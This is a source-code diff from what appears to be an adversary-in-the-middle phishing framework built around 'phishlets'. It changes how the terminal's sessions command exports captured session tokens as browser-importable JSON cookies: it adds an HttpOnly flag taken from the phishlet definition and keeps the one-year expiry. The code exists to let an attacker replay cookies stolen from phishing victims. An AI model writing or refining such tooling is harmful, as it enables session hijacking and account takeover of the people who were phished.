@@ -237,6 +237,12 @@ func (t *Terminal) handleSessions(args []string) error {
 		s_found := false
 		for _, s := range sessions {
 			if s.Id == id {
+				pl, err := t.cfg.GetPhishlet(s.Phishlet)
+				if err != nil {
+					log.Error("%v", err)
+					break
+				}
+
 				s_found = true
 				tcol := dgray.Sprintf("empty")
 				if len(s.Tokens) > 0 {
@@ -248,7 +254,7 @@ func (t *Terminal) handleSessions(args []string) error {
 				log.Printf("\n%s\n", AsRows(keys, vals))
 
 				if len(s.Tokens) > 0 {
-					json_tokens := t.tokensToJSON(s.Tokens)
+					json_tokens := t.tokensToJSON(pl, s.Tokens)
 					t.output("%s", json_tokens)
 				}
 				break
@@ -468,13 +474,14 @@ func (t *Terminal) createHelp() {
 	t.hlp = h
 }
 
-func (t *Terminal) tokensToJSON(tokens map[string]map[string]string) string {
+func (t *Terminal) tokensToJSON(pl *Phishlet, tokens map[string]map[string]string) string {
 	type Cookie struct {
 		Path           string `json:"path"`
 		Domain         string `json:"domain"`
 		ExpirationDate int64  `json:"expirationDate"`
 		Value          string `json:"value"`
 		Name           string `json:"name"`
+		HttpOnly       bool   `json:"httpOnly,omitempty"`
 	}
 
 	var cookies []*Cookie
@@ -486,6 +493,9 @@ func (t *Terminal) tokensToJSON(tokens map[string]map[string]string) string {
 				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
 				Value:          v,
 				Name:           k,
+			}
+			if pl.isTokenHttpOnly(domain, k) {
+				c.HttpOnly = true
 			}
 			cookies = append(cookies, c)
 		}
